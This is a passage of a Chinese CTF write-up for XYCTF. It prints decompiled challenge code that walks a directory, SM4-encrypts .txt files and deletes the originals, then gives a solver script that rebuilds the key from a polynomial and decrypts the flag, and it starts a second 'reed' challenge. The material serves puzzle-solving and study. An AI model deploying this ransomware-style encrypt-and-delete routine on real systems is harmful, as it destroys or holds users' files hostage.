string\">'1'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> terms\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">gen_key</span><span class=\"token punctuation\">(</span>poly_terms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    binary <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span>\n    <span class=\"token keyword\">for</span> term <span class=\"token keyword\">in</span> poly_terms<span class=\"token punctuation\">:</span>\n        exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> exponent <span class=\"token operator\">&lt;=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">:</span>  \n            binary<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> exponent<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    binary_str <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> binary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    hex_key <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>binary_str<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> hex_key\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">read_polynomial_from_file</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_encrypt</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> plaintext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SM4 key must be 16 bytes\"</span>\n    cipher <span class=\"token operator\">=</span> sm4<span class=\"token punctuation\">.</span>CryptSM4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cipher<span class=\"token punctuation\">.</span>set_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> sm4<span class=\"token punctuation\">.</span>SM4_ENCRYPT<span class=\"token punctuation\">)</span>\n    padded_plaintext <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cipher<span class=\"token punctuation\">.</span>crypt_ecb<span class=\"token punctuation\">(</span>padded_plaintext<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_encrypt_file</span><span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">,</span> output_path<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        plaintext <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    ciphertext <span class=\"token operator\">=</span> sm4_encrypt<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> plaintext<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">resource_path</span><span class=\"token punctuation\">(</span>relative_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">,</span> <span class=\"token string\">'frozen'</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        base_path <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>_MEIPASS\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        base_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>abspath<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>base_path<span class=\"token punctuation\">,</span> relative_path<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">encrypt_directory</span><span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">,</span> sm4_key<span class=\"token punctuation\">,</span> extensions<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\".txt\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Directory does not exist: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>directory<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span>\n    \n    <span class=\"token keyword\">for</span> root<span class=\"token punctuation\">,</span> _<span class=\"token punctuation\">,</span> files <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>walk<span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>ext<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> ext <span class=\"token keyword\">in</span> extensions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                input_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span>\n                output_path <span class=\"token operator\">=</span> input_path <span class=\"token operator\">+</span> <span class=\"token string\">\".enc\"</span>\n                \n                <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                    sm4_encrypt_file<span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">,</span> output_path<span class=\"token punctuation\">,</span> sm4_key<span class=\"token punctuation\">)</span>\n                    os<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span>input_path<span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Encrypted: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>input_path<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> -> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>output_path<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Error encrypting </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>input_path<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        save_ntru_keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        poly_str <span class=\"token operator\">=</span> read_polynomial_from_file<span class=\"token punctuation\">(</span><span class=\"token string\">\"priv_key.txt\"</span><span class=\"token punctuation\">)</span>\n        poly_terms <span class=\"token operator\">=</span> terms<span class=\"token punctuation\">(</span>poly_str<span class=\"token punctuation\">)</span>\n        sm4_key <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>poly_terms<span class=\"token punctuation\">)</span>\n        user_name <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>getlogin<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        target_dir <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\Users\"</span><span class=\"token punctuation\">,</span> user_name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Desktop\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"test_files\"</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            os<span class=\"token punctuation\">.</span>makedirs<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">,</span> exist_ok<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Created directory: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>target_dir<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n            \n        txt_files <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>f <span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">)</span> \n                    <span class=\"token keyword\">if</span> f<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">'.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isfile<span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n        \n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> txt_files<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No .txt files found in directory\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n            \n        <span class=\"token keyword\">for</span> txt_file <span class=\"token keyword\">in</span> txt_files<span class=\"token punctuation\">:</span>\n            file_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>target_dir<span class=\"token punctuation\">,</span> txt_file<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    test_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                \n                ciphertext <span class=\"token operator\">=</span> sm4_encrypt<span class=\"token punctuation\">(</span>sm4_key<span class=\"token punctuation\">,</span> test_data<span class=\"token punctuation\">)</span>\n                encrypted_path <span class=\"token operator\">=</span> file_path <span class=\"token operator\">+</span> <span class=\"token string\">'.enc'</span>\n                \n                <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>encrypted_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n                    f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Error processing </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>txt_file<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n                \n    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Fatal error: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p>发现将是多项式m转换为SM4密钥加密，p，d&#x3D;3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> gmssl <span class=\"token keyword\">import</span> sm4\n<span class=\"token keyword\">import</span> binascii\n<span class=\"token keyword\">import</span> re\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">terms</span><span class=\"token punctuation\">(</span>poly_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    terms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    pattern <span class=\"token operator\">=</span> <span class=\"token string\">r'([+-]?\\s*x\\^?\\d*|[-+]?\\s*\\d+)'</span>\n    matches <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>finditer<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> poly_str<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> matches<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">)</span>\n        term <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+x'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'-x'</span><span class=\"token punctuation\">:</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x^'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x^'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                coeff <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span>\n            terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coeff <span class=\"token operator\">*</span> exponent<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> <span class=\"token string\">'x'</span> <span class=\"token keyword\">in</span> term<span class=\"token punctuation\">:</span>\n            coeff_part <span class=\"token operator\">=</span> term<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> coeff_part <span class=\"token keyword\">or</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">elif</span> coeff_part <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>coeff_part<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'+1'</span> <span class=\"token keyword\">or</span> term <span class=\"token operator\">==</span> <span class=\"token string\">'1'</span><span class=\"token punctuation\">:</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                terms<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">return</span> terms\n\n<span class=\"token comment\"># 解密函数</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_decrypt</span><span class=\"token punctuation\">(</span>key_hex<span class=\"token punctuation\">,</span> ciphertext_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    key <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>key_hex<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    cipher <span class=\"token operator\">=</span> sm4<span class=\"token punctuation\">.</span>CryptSM4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cipher<span class=\"token punctuation\">.</span>set_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> sm4<span class=\"token punctuation\">.</span>SM4_DECRYPT<span class=\"token punctuation\">)</span>\n    ciphertext <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>unhexlify<span class=\"token punctuation\">(</span>ciphertext_hex<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n    plaintext <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">.</span>crypt_ecb<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> plaintext\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sm4_encrypt</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> plaintext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SM4 key must be 16 bytes\"</span>\n    cipher <span class=\"token operator\">=</span> sm4<span class=\"token punctuation\">.</span>CryptSM4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    cipher<span class=\"token punctuation\">.</span>set_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> sm4<span class=\"token punctuation\">.</span>SM4_ENCRYPT<span class=\"token punctuation\">)</span>\n    padded_plaintext <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> cipher<span class=\"token punctuation\">.</span>crypt_ecb<span class=\"token punctuation\">(</span>padded_plaintext<span class=\"token punctuation\">)</span>\n\n\nm<span class=\"token operator\">=</span><span class=\"token string\">\"-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1\"</span>\nm_ <span class=\"token operator\">=</span> terms<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m_<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">gen_key</span><span class=\"token punctuation\">(</span>poly_terms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    binary <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span>\n    <span class=\"token keyword\">for</span> term <span class=\"token keyword\">in</span> poly_terms<span class=\"token punctuation\">:</span>\n        exponent <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>term<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> term <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> exponent <span class=\"token operator\">&lt;=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">:</span>  \n            binary<span class=\"token punctuation\">[</span><span class=\"token number\">127</span> <span class=\"token operator\">-</span> exponent<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    binary_str <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> binary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    hex_key <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>binary_str<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> hex_key\n\nhex_key <span class=\"token operator\">=</span> gen_key<span class=\"token punctuation\">(</span>m_<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>hex_key<span class=\"token punctuation\">)</span>\n\nencrypted_flag <span class=\"token operator\">=</span> <span class=\"token string\">\"bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835\"</span>\nflag <span class=\"token operator\">=</span> sm4_decrypt<span class=\"token punctuation\">(</span>hex_key<span class=\"token punctuation\">,</span> encrypted_flag<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Decrypted Flag:\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span></code></pre>\n\n<p>XYCTF{Crypto0_can_n0t_So1ve_it}</p>\n<h3 id=\"reed\"><a href=\"#reed\" class=\"headerlink\" title=\"reed\"></a>reed</h3><p>题目给出一个基于random的随机数生成器</p>\n<p>但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514</p>\n<p>有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> random\n\ntable <span class=\"token 